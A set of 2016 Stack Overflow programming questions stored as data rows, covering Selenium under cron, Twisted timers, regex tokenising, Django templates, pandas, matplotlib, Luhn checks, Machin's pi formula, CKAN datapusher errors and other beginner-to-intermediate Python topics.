<pre><code>WebDriverException: Message: Can't load the profile. Profile Dir: /tmp/tmpQ4vStP If you specified a log_file in the FirefoxBinary constructor, check it for details.
</code></pre>

<p>Try for example this script:</p>

<pre><code>from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from pyvirtualdisplay import Display
from selenium import webdriver
import datetime
import logging

FIREFOX_PATH = '/usr/bin/firefox'

if __name__ == '__main__':
    cur_date = datetime.datetime.now().strftime('%Y-%m-%d')
    logging.basicConfig(filename=""./logs/download_{0}.log"".format(cur_date),
                        filemode='w',
                        level=logging.DEBUG,
                        format='%(asctime)s - %(levelname)s - %(message)s')
    try:
        display = Display(visible=0, size=(800, 600))
        display.start()
        print 'start'
        logging.info('start')
        binary = FirefoxBinary(FIREFOX_PATH,
                               log_file='/home/egor/dev/test/logs/firefox_binary_log.log')
        driver = webdriver.Firefox()
        driver.get(""http://google.com"")
        logging.info('title: ' + driver.title)
        driver.quit()
        display.stop()
    except:
        logging.exception('')
    logging.info('finish')
    print 'finish'
</code></pre>

<p>The crontab command for it:</p>

<pre><code>0 13 * * * cd ""/home/egor/dev/test"" &amp;&amp; python test.py
</code></pre>

<p>The log file for this script looks like this:</p>

<pre><code>2016-09-27 16:30:01,742 - DEBUG - param: ""['Xvfb', '-help']"" 
2016-09-27 16:30:01,743 - DEBUG - command: ['Xvfb', '-help']
2016-09-27 16:30:01,743 - DEBUG - joined command: Xvfb -help
2016-09-27 16:30:01,745 - DEBUG - process was started (pid=23042)
2016-09-27 16:30:01,747 - DEBUG - process has ended
2016-09-27 16:30:01,748 - DEBUG - return code=0
2016-09-27 16:30:01,748 - DEBUG - stdout=
2016-09-27 16:30:01,751 - DEBUG - param: ""['Xvfb', '-br', '-nolisten', 'tcp', '-screen', '0', '800x600x24', ':1724']"" 
2016-09-27 16:30:01,751 - DEBUG - command: ['Xvfb', '-br', '-nolisten', 'tcp', '-screen', '0', '800x600x24', ':1724']
2016-09-27 16:30:01,751 - DEBUG - joined command: Xvfb -br -nolisten tcp -screen 0 800x600x24 :1724
2016-09-27 16:30:01,753 - DEBUG - param: ""['Xvfb', '-br', '-nolisten', 'tcp', '-screen', '0', '800x600x24', ':1725']"" 
2016-09-27 16:30:01,753 - DEBUG - command: ['Xvfb', '-br', '-nolisten', 'tcp', '-screen', '0', '800x600x24', ':1725']
2016-09-27 16:30:01,753 - DEBUG - joined command: Xvfb -br -nolisten tcp -screen 0 800x600x24 :1725
2016-09-27 16:30:01,755 - DEBUG - process was started (pid=23043)
2016-09-27 16:30:01,755 - DEBUG - DISPLAY=:1725
2016-09-27 16:30:01,855 - INFO - start
2016-09-27 16:30:31,965 - ERROR - 
Traceback (most recent call last):
  File ""test.py"", line 31, in &lt;module&gt;
    driver = webdriver.Firefox()
  File ""/usr/local/lib/python2.7/dist-packages/selenium/webdriver/firefox/webdriver.py"", line 103, in __init__
    self.binary, timeout)
  File ""/usr/local/lib/python2.7/dist-packages/selenium/webdriver/firefox/extension_connection.py"", line 51, in __init__
    self.binary.launch_browser(self.profile, timeout=timeout)
  File ""/usr/local/lib/python2.7/dist-packages/selenium/webdriver/firefox/firefox_binary.py"", line 68, in launch_browser
    self._wait_until_connectable(timeout=timeout)
  File ""/usr/local/lib/python2.7/dist-packages/selenium/webdriver/firefox/firefox_binary.py"", line 106, in _wait_until_connectable
    % (self.profile.path))
WebDriverException: Message: Can't load the profile. Profile Dir: /tmp/tmpQ4vStP If you specified a log_file in the FirefoxBinary constructor, check it for details.

2016-09-27 16:30:31,966 - INFO - finish
</code></pre>

<p>What I have tried:</p>

<ol>
<li>Ensure that the script file is owned by root</li>
<li>Use export DISPLAY=:0; or export DISPLAY=:99; in crontab command</li>
<li>set the HOME variable in the crontab to the path of the home directory of the user that the cronjob was being run as</li>
</ol>

<p>I'm really stuck with this problem.</p>

<p>I have python 2.7.10, selenium 2.53.6 with Xvbf and Firefox 47.0.1 on Debian 7.7</p>
"
39669718,4807043.0,2016-09-23 21:20:19+00:00,2,how to call a callback function after certain amount of time,"<p>I'm using Twisted along with Txmongo lib.
In the following function, I want to invoke cancelTest() 5 secs later. But the code does not work. How can I make it work?</p>

<pre><code>from twisted.internet import task

def diverge(self, d):
    if d == 'Wait':
        self.flag = 1
        # self.timeInit = time.time()
        clock = task.Clock()
        for ip in self.ips:
            if self.factory.dictQueue.get(ip) is not None:
                self.factory.dictQueue[ip].append(self)
            else:
                self.factory.dictQueue[ip] = deque([self])
                # self.factory.dictQueue[ip].append(self)

        log.msg(""-----------------the queue after wait"")
        log.msg(self.factory.dictQueue)
###############################HERE, this does not work
        self.dtime = task.deferLater(clock, 5, self.printData)
#############################
        self.dtime.addCallback(self.cancelTest)
        self.dtime.addErrback(log.err)
    else:
        self.cancelTimeOut()
        d.addCallback(self.dispatch)
        d.addErrback(log.err)



def sendBackIP(self):
    self.ips.pop(0)
    log.msg(""the IPs: %s"" % self.ips)

    d = self.factory.service.checkResource(self.ips)

    d.addCallback(self.diverge) ###invoke above function
    log.msg(""the result from checkResource: "")
    log.msg()
</code></pre>
"
39694155,2288883.0,2016-09-26 03:09:13+00:00,2,Javascript regexp with unicode and punctuation,"<p>I have the follow test case for splitting unicoded words but don't know how to do in it javascript.</p>

<pre><code>describe(""garden: utils"", () =&gt; {
  it(""should split correctly"", () =&gt; {
    assert.deepEqual(segmentation('Hockey is a popular sport in Canada.'), [
      'Hockey', 'is', 'a', 'popular', 'sport', 'in', 'Canada', '.'
    ]);

    assert.deepEqual(segmentation('How many provinces are there in Canada?'), [
      'How', 'many', 'provinces', 'are', 'there', 'in', 'Canada', '?'
    ]);

    assert.deepEqual(segmentation('The forest is on fire!'), [
      'The', 'forest', 'is', 'on', 'fire', '!'
    ]);

    assert.deepEqual(segmentation('Emily Carr, who was born in 1871, was a great painter.'), [
      'Emily', 'Carr', ',', 'who', 'was', 'born', 'in', '1871', ',', 'was', 'a', 'great', 'painter', '.'
    ]);

    assert.deepEqual(segmentation('This is David\'s computer.'), [
      'This', 'is', 'David', '\'', 's', 'computer', '.'
    ]);

    assert.deepEqual(segmentation('The prime minister said, ""We will win the election.""'), [
      'The', 'prime', 'minister', 'said', ',', '""', 'We', 'will', 'win', 'the', 'election', '.', '""'
    ]);

    assert.deepEqual(segmentation('There are three positions in hockey: goalie, defence, and forward.'), [
      'There', 'are', 'three', 'positions', 'in', 'hockey', ':', 'goalie', ',', 'defence', ',', 'and', 'forward', '.'
    ]);

    assert.deepEqual(segmentation('The festival is very popular; people from all over the world visit each year.'), [
      'The', 'festival', 'is', 'very', 'popular', ';', 'people', 'from', 'all', 'over', 'the', 'world',
      'visit', 'each', 'year', '.'
    ]);

    assert.deepEqual(segmentation('Mild, wet, and cloudy - these are the characteristics of weather in Vancouver.'), [
      'Mild', ',', 'wet', ',', 'and', 'cloudy', '-', 'these', 'are', 'the', 'characteristics', 'of', 'weather',
      'in', 'Vancouver', '.'
    ]);

    assert.deepEqual(segmentation('sweet-smelling'), [
      'sweet', '-', 'smelling'
    ]);
  });

  it(""should not split unicoded words"", () =&gt; {
    assert.deepEqual(segmentation('hacer a propÃ³sito'), [
      'hacer', 'a', 'propÃ³sito'
    ]);

    assert.deepEqual(segmentation('nhÃ  em cÃ³ con mÃ¨o'), [
      'nhÃ ', 'em', 'cÃ³', 'con', 'mÃ¨o'
    ]);
  });

  it(""should group periods"", () =&gt; {
    assert.deepEqual(segmentation('So are ... the fishes.'), [
      'So', 'are', '...', 'the', 'fishes', '.'
    ]);

    assert.deepEqual(segmentation('So are ...... the fishes.'), [
      'So', 'are', '......', 'the', 'fishes', '.'
    ]);

    assert.deepEqual(segmentation('arriba arriba ja....'), [
      'arriba', 'arriba', 'ja', '....'
    ]);
  });
});
</code></pre>

<p>Here is the equivalent expression in python:</p>

<pre><code>class Segmentation(BaseNLPProcessor):
    pattern = re.compile('((?u)\w+|\.{2,}|[%s])' % string.punctuation)

    @classmethod
    def ignore_value(cls, value):
        # type: (str) -&gt; bool
        return negate(compose(is_empty, string.strip))(value)

    def split(self):
        # type: () -&gt; List[str]
        return filter(self.ignore_value, self.pattern.split(self.value()))
</code></pre>

<p>I want to write a equivalent function in python for javascript to split by unicoded words and punctuation, group by multiple dots ...</p>

<pre><code>Segmentation(""Hockey is a popular sport in Canada."").split()
</code></pre>
"
40077966,7027203.0,2016-10-17 03:13:38+00:00,2,Cropping Python lists by value instead of by index,"<p>Good evening, StackOverflow. 
Lately, I've been wrestling with a Python program which I'll try to outline as briefly as possible. </p>

<p>In essence, my program plots (and then fits a function to) graphs. Consider <a href=""https://i.stack.imgur.com/axth1.png"" rel=""nofollow"">this graph.</a>
The graph plots just fine, but I'd like it to do a little more than that: since the data is periodic over an interval <strong>OrbitalPeriod</strong> (1.76358757), I'd like it to start with our <em>first x value</em> and then iteratively plot all of the points  <strong>OrbitalPeriod</strong> away from it, and then do the same exact thing over the next region of length <strong>OrbitalPeriod</strong>. </p>

<p>I know that there is a way to slice lists in Python of the form</p>

<pre><code>croppedList = List[a:b]
</code></pre>

<p>where <em>a</em> and <em>b</em> are the indices of the first and last elements you'd like to include in the new list, respectively. However, I have no idea what the indices are going to be for each of the values, or how many values fall between each <strong>OrbitalPeriod</strong>-sized interval. </p>

<p>What I want to do in pseudo-code looks something like this.</p>

<blockquote>
  <p>croppedList = fullList on the domain [a + (N * <strong>OrbitalPeriod</strong>), a + (N+1 * <strong>OrbitalPeriod</strong>)] </p>
</blockquote>

<p>where <strong>a</strong> is the x-value of the first meaningful data point.</p>

<p>If you have a workaround for this or a cropping method that would accept values instead of indices as arguments, please let me know. Thanks!</p>
"
40077880,5390619.0,2016-10-17 03:02:22+00:00,2,Bootstrap accordion with Django: How to only load the data for the open accordion section?,"<p>I'm trying to make a webpage that will display recipes in the format of a bootstrap accordion like so (<a href=""https://i.stack.imgur.com/1QEbG.png"" rel=""nofollow"">see here</a>).
This is how I'm doing it as of now:</p>

<pre><code>&lt;div class=""panel-group"" id=""accordion""&gt;
    {% for recipe in recipes %}
    &lt;div class=""panel panel-default""&gt;
        &lt;div class=""panel-heading""&gt;
            &lt;h4 class=""panel-title""&gt;
                &lt;a data-toggle=""collapse"" data-parent=""#accordion"" href=""#collapse{{ forloop.counter }}""&gt;
                    {{ recipe }}
                &lt;/a&gt;
            &lt;/h4&gt;
        &lt;/div&gt;
        &lt;div id=""collapse{{ forloop.counter }}"" class=""panel-collapse collapse""&gt;
            &lt;div class=""panel-body""&gt;
                &lt;table class=""table table-hover""&gt;
                    {% for ingredient in  foodtype|ingredients_in_recipe:recipe %}
                        &lt;tr&gt;
                            &lt;td&gt;
                                {{ ingredient.ingredient_name }}
                            &lt;/td&gt;
                            &lt;td&gt;
                                {{ ingredient.ingredient_quantity }}
                            &lt;/td&gt;
                        &lt;/tr&gt;
                    {% endfor %}
                    &lt;p&gt;{{ recipe.details }}&lt;/p&gt;
                &lt;/table&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    {% endfor %}
&lt;/div&gt;
</code></pre>

<p>I have made a custom template tag for this like so:</p>

<pre><code>@register.filter
def ingredients_in_recipe(foodtype, recipe):
    return foodtype.ingredient_set.filter(recipe=recipe).order_by(""ingredient_name"")
</code></pre>

<p>The problem is that I have 200+ recipes and loading all this data is way too slow. Ideally the template tag function ingredients_in_recipe should only be called when the user clicks on the recipe. However from my understanding this isn't possible because Django runs it all then sends the rendered HTML to the user.</p>

<p>Is there anyway I could circumvent this issue whilst still keeping the accordion style like in the picture?</p>

<p>Thanks in advance,
Max</p>

<p><strong>EDIT:</strong> Here's my view as well</p>

<pre><code>def detail(request, foodtype_id):
     foodtype = get_object_or_404(foodtype, id=foodtype_id)
     recipe = foodtype.recipe_set.values_list('recipe').order_by('recipe').distinct()
     context = {
         'foodtype': foodtype,
         'recipe': recipe,
     }
     return render(request, 'main/detail.html', context)
</code></pre>
"
40077591,7028693.0,2016-10-17 02:16:34+00:00,2,"Output random number between 30-35 using Random.seed(), 'for' and multiplication in Python","<p>I am new to programming. I had an assignment to write a code that will output a random number between 30 and 35. This code needs to use <code>random.seed()</code>, a FOR statement and a multiplication. I understand the <code>random.seed([x])</code> generates an initial value that could be used in the proceeding section of the code. However, I cant figure out how to proceed after obtaining the value of the random:</p>

<pre><code>import random
random.seed(70)
print(random.random()) # This returns a value of 0.909769237923872
</code></pre>

<p>How do i use this value to generate a random value between 30 and 35?</p>

<p>Note: Without the specific directions above, I have been able to write two codes that functions as desired, so please I am not looking for alternative ways of writing the code.  </p>
"
40077230,5989888.0,2016-10-17 01:14:49+00:00,2,Luhn's Algorithm Pseudocode to code,"<p>Hey guys I'm fairly new to the programming world. For a school practice question I was given the following text and I'm suppose to convert this into code. I've spent hours on it and still can't seem to figure it out but I'm determine to learn this. I'm currently getting the error</p>

<pre><code>  line 7, in &lt;module&gt; if i % 2 == 0: TypeError: not all arguments converted during string formatting 
</code></pre>

<p>What does this mean? I'm still learning loops and I'm not sure if it's in the correct format or not. Thanks for your time. </p>

<pre><code># GET user's credit card number
# SET total to 0
# LOOP backwards from the last digit to the first one at a time
    # IF the position of the current digit is even THEN
        # DOUBLE the value of the current digit
        # IF the doubled value is more than 9 THEN
            # SUM the digits of the doubled value
        # ENDIF
       # SUM the calculated value and the total
    # ELSE
        # SUM the current digit and the total
    # ENDIF
# END loop
# IF total % 10 == 0 THEN
    # SHOW Number is valid
# ELSE
    # SHOW number is invalid
# ENDIF


creditCard = input(""What is your creditcard?"")
total = 0
for i in creditCard[-1]:
    if i % 2 == 0:
        i = i * 2
        if i &gt; 9:
            i += i
    total = total + i

    else:
        total = total + i

if total % 10 == 0:
    print(""Valid"")

else:
    print(""Invalid"")
</code></pre>
"
40041094,2349997.0,2016-10-14 10:35:48+00:00,2,Rupee symbol shows as blank box on invoice report in odoo,"<p><strong>Issue summary :</strong> Rupee symbol shows up as box on invoice report. It shows up correctly on the web but when a report is printed then it shows a box instead of the rupee symbol.</p>

<p><strong>What I have tried :</strong></p>

<ul>
<li><p>Checked default currency for the company; it is INR.</p></li>
<li><p>The INR symbol is showing correct in the INR currency i.e. â¹</p></li>
<li><p>Downgraded wkhtmltopdf from version 0.12.2 to 0.12.1 as the former has caused problem to many people.</p></li>
<li><p>Even installed a font called <strong>Foradian Rupee Font</strong></p></li>
<li><p>I have Checked by changing default currency to Euro and the euro symbol is showing up on the prints.</p></li>
<li><p>Tried everything that is given here but nothing helped: <a href=""http://stackoverflow.com/questions/4627802/squared-characters-issue-on-wkhtmltopdf"">URL</a></p></li>
</ul>

<p>So, I have tried a lot of things but nothing worked. If anyone here knows what is happening and could help me move to the right direction, it would be really helpful.</p>
"
39727689,6639331.0,2016-09-27 14:43:00+00:00,2,Why is the computing of the value of pi using the Machin Formula giving a wrong value?,"<p>For my school project I was trying to compute the value of using different methods. One of the formula I found was the Machin Formula that can be calculated using the Taylor expansion of arctan(x).    </p>

<p>I wrote the following code in python:</p>

<pre><code>import decimal

count = pi = a = b = c = d = val1 = val2 = decimal.Decimal(0) #Initializing the variables      
decimal.getcontext().prec = 25 #Setting percision

while (decimal.Decimal(count) &lt;= decimal.Decimal(100)): 
    a = pow(decimal.Decimal(-1), decimal.Decimal(count))
    b = ((decimal.Decimal(2) * decimal.Decimal(count)) + decimal.Decimal(1))
    c = pow(decimal.Decimal(1/5), decimal.Decimal(b))
    d = (decimal.Decimal(a) / decimal.Decimal(b)) * decimal.Decimal(c)
    val1 = decimal.Decimal(val1) + decimal.Decimal(d)
    count = decimal.Decimal(count) + decimal.Decimal(1)
    #The series has been divided into multiple small parts to reduce confusion

count = a = b = c = d = decimal.Decimal(0) #Resetting the variables

while (decimal.Decimal(count) &lt;= decimal.Decimal(10)):
    a = pow(decimal.Decimal(-1), decimal.Decimal(count))
    b = ((decimal.Decimal(2) * decimal.Decimal(count)) + decimal.Decimal(1))
    c = pow(decimal.Decimal(1/239), decimal.Decimal(b))
    d = (decimal.Decimal(a) / decimal.Decimal(b)) * decimal.Decimal(c)
    val2 = decimal.Decimal(val2) + decimal.Decimal(d)
    count = decimal.Decimal(count) + decimal.Decimal(1)
    #The series has been divided into multiple small parts to reduce confusion

pi = (decimal.Decimal(16) * decimal.Decimal(val1)) - (decimal.Decimal(4) * decimal.Decimal(val2))
print(pi)
</code></pre>

<p>The problem is that I am getting the right value of pi only till 15 decimal places, no matter the number of times the loop repeats itself.</p>

<p>For example:</p>

<p>at 11 repetitions of the first loop</p>

<p>pi = 3.141592653589793408632493</p>

<p>at 100 repetitions of the first loop</p>

<p>pi = 3.141592653589793410703296</p>

<p>I am not increasing the repetitions of the second loop as arctan(1/239) is very small and reaches an extremely small value with a few repetitions and therefore should not affect the value of pi at only 15 decimal places.</p>

<p>EXTRA INFORMATION:</p>

<p>The Machin Formula states that:</p>

<pre><code>   Ï = (16 * Summation of (((-1)^n) / 2n+1) * ((1/5)^(2n+1))) - (4 * Summation of (((-1)^n) / 2n+1) * ((1/239)^(2n+1)))    
</code></pre>
"
39727271,6840039.0,2016-09-27 14:24:05+00:00,2,Pandas: aggregate data through the dataframe,"<p>I have dataframe:</p>

<pre><code>ID,""url"",""app_name"",""used_at"",""active_seconds"",""device_connection"",""device_os"",""device_type"",""device_usage""
1ca9bb884462c3ba2391bf669c22d4bd,"""",VK Client,2016-01-01 00:00:13,5,3g,ios,smartphone,home
b8f4df3f99ad786a77897c583d98f615,"""",VKontakte,2016-01-01 00:01:45,107,wifi,android,smartphone,home
1ca9bb884462c3ba2391bf669c22d4bd,"""",Twitter,2016-01-01 00:02:48,20,3g,ios,smartphone,home
1ca9bb884462c3ba2391bf669c22d4bd,"""",VK Client,2016-01-01 00:03:08,796,3g,ios,smartphone,home
b8f4df3f99ad786a77897c583d98f615,"""",WhatsApp Messenger,2016-01-01 00:03:32,70,wifi,android,smartphone,home
b8f4df3f99ad786a77897c583d98f615,"""",VKontakte,2016-01-01 00:04:42,27,wifi,android,smartphone,home
b8f4df3f99ad786a77897c583d98f615,"""",VKontakte,2016-01-01 00:05:30,5,wifi,android,smartphone,home
b8f4df3f99ad786a77897c583d98f615,"""",WhatsApp Messenger,2016-01-01 00:05:36,47,wifi,android,smartphone,home
b8f4df3f99ad786a77897c583d98f615,"""",VKontakte,2016-01-01 00:06:23,20,wifi,android,smartphone,home
a703114aa8a03495c3e042647212fa63,"""",Instagram,2016-01-01 00:06:41,118,3g,android,smartphone,home
1637ce5a4c4868e694004528c642d0ac,"""",Camera,2016-01-01 00:06:43,16,wifi,android,smartphone,home
1637ce5a4c4868e694004528c642d0ac,"""",VKontakte,2016-01-01 00:07:00,45,wifi,android,smartphone,home
a703114aa8a03495c3e042647212fa63,"""",VKontakte,2016-01-01 00:08:40,99,3g,android,smartphone,home
1637ce5a4c4868e694004528c642d0ac,"""",VKontakte,2016-01-01 00:10:05,1,wifi,android,smartphone,home
</code></pre>

<p>I need to count share of every <code>app_name</code> to every <code>ID</code>.
But I can't do next:
sum of every app to every id I should divide to sum of all app to id and next multiple 100. (to find percent)
I do:</p>

<pre><code>short = df.groupby(['ID', 'app_name']).agg({'app_name': len, 'active_seconds': sum}).rename(columns={'active_seconds': 'count_sec', 'app_name': 'sum_app'}).reset_index()
</code></pre>

<p>but it only returns quantity to every app, when I try</p>

<pre><code>short = df.groupby(['ID', 'app_name']).agg({'app_name': len, 'active_seconds': sum / df.ID.app_name.sum() * 100}).rename(columns={'active_seconds': 'count_sec', 'app_name': 'sum_app'}).reset_index()
</code></pre>

<p>it returns an error</p>

<p>How can I fix that?</p>
"
40041757,6868337.0,2016-10-14 11:12:29+00:00,2,Converting pandas dataframe to csv,"<p><a href=""https://i.stack.imgur.com/ZlUc1.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/ZlUc1.png"" alt=""enter image description here""></a>
I have the dataframe above and I wish to convert it into a csv file.<br>
I am currently using <code>df.to_csv('my_file.csv')</code> to convert it but I want to leave 3 blanks columns. For the rows of the file above I have the following procedure.  </p>

<pre><code>dirname = os.path.dirname(os.path.abspath(__file__))
csvfilename = os.path.join(dirname, 'MainFile.csv')
with open(csvfilename, 'wb') as output_file:
    writer = csv.writer(output_file, delimiter=',')
    writer.writerow([])
    writer.writerow(["""",""Amazon"",""Weekday"",""Weekend""])
    writer.writerow(["""",""Ebay"",wdvad,wevad])
    writer.writerow(["""",""Kindle"",wdmpv,wempv])
    writer.writerow([])
</code></pre>

<p>I want to incorporate the data frame right after the blanks space with three blank columns. How can I add the dataframe in continuation to the existing csv file so that I can also add more rows with data after the dataframe. </p>
"
39730254,6889207.0,2016-09-27 16:50:44+00:00,2,How do I find the first occurrence of a vowel and move it behind the original word (pig latin)?,"<p>I need to find the first vowel of a string in python, and I'm a beginner. I'm instructed to move the characters before the first vowel to the end of the word and add '-ay'. For example ""big"" becomes ""ig-bay"" and ""string"" becomes ""ing-stray"" (piglatin, basically).</p>

<p>This is what I have so far:</p>

<pre><code>def convert(s):

    ssplit = s.split()
    beginning = """"
    for char in ssplit:
        if char in ('a','e','i','o','u'):
            end = ssplit[char:]
            strend = str(end)
        else:
            beginning = beginning + char
    return strend + ""-"" + beginning + ""ay""
</code></pre>

<p>I need to find a way to stop the ""if"" statement from looking for further vowels after finding the first vowel - at least I think it's the problem.  Thanks!</p>
"
39730467,6605826.0,2016-09-27 17:02:07+00:00,2,How can I get the actual axis limits when using ax.axis('equal')?,"<p>I am using <code>ax.axes('equal')</code> to make the axis spacing equal on X and Y, and also setting <code>xlim</code> and <code>ylim</code>. This over-constrains the problem and the actual limits are not what I set in <code>ax.set_xlim()</code> or <code>ax.set_ylim()</code>. Using <code>ax.get_xlim()</code> just returns what I provided. How can I get the actual visible limits of the plot?</p>

<pre><code>f,ax=plt.subplots(1) #open a figure
ax.axis('equal') #make the axes have equal spacing
ax.plot([0,20],[0,20]) #test data set

#change the plot axis limits
ax.set_xlim([2,18]) 
ax.set_ylim([5,15])

#read the plot axis limits
xlim2=array(ax.get_xlim())
ylim2=array(ax.get_ylim())

#define indices for drawing a rectangle with xlim2, ylim2
sqx=array([0,1,1,0,0])
sqy=array([0,0,1,1,0])

#plot a thick rectangle marking the xlim2, ylim2
ax.plot(xlim2[sqx],ylim2[sqy],lw=3) #this does not go all the way around the edge
</code></pre>

<p>What commands will let me draw the green box around the actual edges of the figure? </p>

<p><a href=""http://i.stack.imgur.com/Z14Jg.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/Z14Jg.png"" alt=""Plot showing that the results of get_xlim() and get_ylim() do not match the visible bounds of the figure""></a></p>

<p>Related: <a href=""http://stackoverflow.com/questions/39775709/how-to-enforce-both-xlim-and-ylim-while-using-ax-axesequal/39795483#39795483"" title=""Force xlim, ylim, and axes&#40;&#39;equal&#39;&#41; at the same time by letting margins auto-adjust"">Force <code>xlim</code>, <code>ylim</code>, and <code>axes('equal')</code> at the same time by letting margins auto-adjust</a> </p>
"
39730468,992600.0,2016-09-27 17:02:16+00:00,2,Convert column's data to enumerated dictionary key-value,"<p>Is there a better way (in the sense of minimal code) that can do the followings: convert a column to enumerated numerical values so it should go somewhat this way:</p>

<ol>
<li>get a <strong>set</strong> of items in a columns </li>
<li>make a <strong>enumrated dictionary</strong> with key value</li>
<li>revert the key with value</li>
<li>use the key-value result instead of the data in a new column.</li>
</ol>

<p>So here's what I do today and wonder if anyone can show a classic way to do that so I can avoid writing the function <em>get_color_val</em>:</p>

<pre><code>import pandas as pd  
cars = pd.DataFrame({""car_name"": [""BMW"",""BMW"",""ACCURA"",""ACCURA"",""ACCURA"",""BMW"",""BMW"",""BMW""],""color"":[""RED"",""RED"",""RED"",""RED"",""GREEN"",""BLACK"",""BLUE"",""BLUE""]})

color_dict = dict(enumerate(set(cars[""color""])))
color_dict = dict((y,x) for x,y in color_dict.iteritems())

def get_color_val(row):
    my_key = row[""color""]
    my_value = color_dict.get(my_key)
    return my_value

cars[""color_val""] = cars.apply(get_color_val, axis=1)
cars = cars.drop(""color"",1)
print cars
</code></pre>

<blockquote>
  <p>Result</p>
</blockquote>

<pre><code>Before------------
car_name  color
0      BMW    RED
1      BMW    RED
2   ACCURA    RED
3   ACCURA    RED
4   ACCURA  GREEN
5      BMW  BLACK
6      BMW   BLUE
7      BMW   BLUE


After------------
car_name  color_val
0      BMW          3
1      BMW          3
2   ACCURA          3
3   ACCURA          3
4   ACCURA          2
5      BMW          1
6      BMW          0
7      BMW          0
</code></pre>
"
40038320,1183277.0,2016-10-14 08:18:17+00:00,2,Rmarkdown calls different Python than bash,"<p>I am trying to call a Python script from within Rmarkdown. The script relies on Biopython but this library is not found if called from rmarkdown</p>

<p><strong>from Rmarkdown</strong></p>

<pre><code>```{r, engine = ""bash""}
python --version
```
</code></pre>

<blockquote>
  <p>Python 2.7.10</p>
</blockquote>

<p><strong>from the bash shell</strong></p>

<pre><code>python --version
</code></pre>

<blockquote>
  <p>Python 2.7.12</p>
</blockquote>

<p>How can I control which version is called?</p>

<p>(I recall having installed a different python version with homebrew which might have led to this mess...)</p>
"
39663415,6854034.0,2016-09-23 14:34:45+00:00,2,ckan datapusher /api/3/action/resource_show (Caused by <class 'socket.error'>: [Errno 111] Connection refused) error,"<p>I'm trying install ckan 2.2.1 + pgsql 9.1 + solr 3.6 + rhel 6.6.</p>

<p>I set file store, and datastore plugin. I tried to use 'upload to datastore' menu in ckan web. then I got this error.</p>

<pre><code>2016-09-23 23:16:54,655 INFO  [ckan.lib.base]  /dataset/datastore/resource_data/7a82b5c2-d68c-4bed-b5c6-fcc460011455 render time 0.363 seconds
Job ""push_to_datastore (trigger: RunTriggerNow, run = True, next run at: None)"" raised an exception
Traceback (most recent call last):
  File ""/usr/lib/ckan/default/lib/python2.7/site-packages/apscheduler/scheduler.py"", line 512, in _run_job
    retval = job.func(*job.args, **job.kwargs)
  File ""/usr/lib/ckan/default/src/ckan/datapusher/datapusher/jobs.py"", line 300, in push_to_datastore
    resource = get_resource(resource_id, ckan_url, api_key)
  File ""/usr/lib/ckan/default/src/ckan/datapusher/datapusher/jobs.py"", line 250, in get_resource
    'Authorization': api_key}
  File ""/usr/lib/ckan/default/lib/python2.7/site-packages/requests/api.py"", line 87, in post
    return request('post', url, data=data, **kwargs)
  File ""/usr/lib/ckan/default/lib/python2.7/site-packages/requests/api.py"", line 44, in request
    return session.request(method=method, url=url, **kwargs)
  File ""/usr/lib/ckan/default/lib/python2.7/site-packages/requests/sessions.py"", line 279, in request
    resp = self.send(prep, stream=stream, timeout=timeout, verify=verify, cert=cert, proxies=proxies)
  File ""/usr/lib/ckan/default/lib/python2.7/site-packages/requests/sessions.py"", line 374, in send
    r = adapter.send(request, **kwargs)
  File ""/usr/lib/ckan/default/lib/python2.7/site-packages/requests/adapters.py"", line 209, in send
    raise ConnectionError(e)
ConnectionError: HTTPConnectionPool(host='default.ckan.com', port=80): Max retries exceeded with url: /api/3/action/resource_show (Caused by &lt;class 'socket.error'&gt;: [Errno 111] Connection refused)
</code></pre>

<p>ckan, solr is running well. datapusher with 8800 port is running.</p>

<pre><code>$ curl localhost:8800
{
  ""help"": ""\n        Get help at:\n        http://ckan-service-provider.readthedocs.org/.""
}
</code></pre>

<p>Am I missing something for my datapusher ?
Thanks.</p>

<p>I added my ini </p>

<pre><code>cache_dir = /tmp/%(ckan.site_id)s/
beaker.session.key = ckan
beaker.session.secret = CkL+a+Nc6grW1jBM/Ts69mRsE
app_instance_uuid = {f41a65ac-4a33-44fe-bb03-af15b456978e}
who.config_file = %(here)s/who.ini
who.log_level = warning
who.log_file = %(cache_dir)s/who_log.ini
sqlalchemy.url = postgresql://ckan_default:PASS@localhost/ckan_default
ckan.datastore.write_url = postgresql://ckan_default:PASS@localhost/datastore_default
ckan.datastore.read_url = postgresql://datastore_default:PASS@localhost/datastore_default
ckan.datastore.default_fts_lang = english
ckan.datastore.default_fts_index_method = gist
ckan.site_url = http://ckan.daniel.com
ckan.auth.anon_create_dataset = false
ckan.auth.create_unowned_dataset = false
ckan.auth.create_dataset_if_not_in_organization = false
ckan.auth.user_create_groups = false
ckan.auth.user_create_organizations = false
ckan.auth.user_delete_groups = true
ckan.auth.user_delete_organizations = true
ckan.auth.create_user_via_api = false
ckan.auth.create_user_via_web = true
ckan.auth.roles_that_cascade_to_sub_groups = admin
ckan.site_id = default
solr_url = http://127.0.0.1:8983/solr/ckan
ckan.plugins = stats text_view image_view recline_view datastore datapusher
ckan.views.default_views = image_view text_view recline_view
ckan.site_title = CKAN
ckan.site_logo = /base/images/ckan-logo.png
ckan.site_description =
ckan.favicon = /images/icons/ckan.ico
ckan.gravatar_default = identicon
ckan.preview.direct = png jpg gif csv
ckan.preview.loadable = html htm rdf+xml owl+xml xml n3 n-triples turtle plain atom csv tsv rss txt json
ckan.locale_default = en
ckan.locale_order = en pt_BR ja it cs_CZ ca es fr el sv sr sr@latin no sk fi ru de pl nl bg ko_KR hu sa sl lv
ckan.locales_offered =
ckan.locales_filtered_out = en_GB
ckan.feeds.authority_name =
ckan.feeds.date =
ckan.feeds.author_name =
ckan.feeds.author_link =
ckan.storage_path =  /usr/lib/ckan/korea/src/ckan/filestore
ckan.max_resource_size = 10
ckan.max_image_size = 5
ckan.datapusher.formats = csv xls xlsx tsv application/csv application/vnd.ms-excel application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
ckan.datapusher.url = http://ckan.daniel.com:8800/
ckan.hide_activity_from_users = %(ckan.site_id)s
</code></pre>
"
39664509,6004014.0,2016-09-23 15:29:43+00:00,2,How can I add to the initial definition of a python class inheriting from another class?,"<p>I'm trying to define <code>self.data</code> inside a class inheriting from a class</p>

<pre><code>class Object():
    def __init__(self):
        self.data=""1234""

class New_Object(Object):
    # Code changing self.data here
</code></pre>

<p>But I ran into an issue.</p>

<pre><code>class Object():
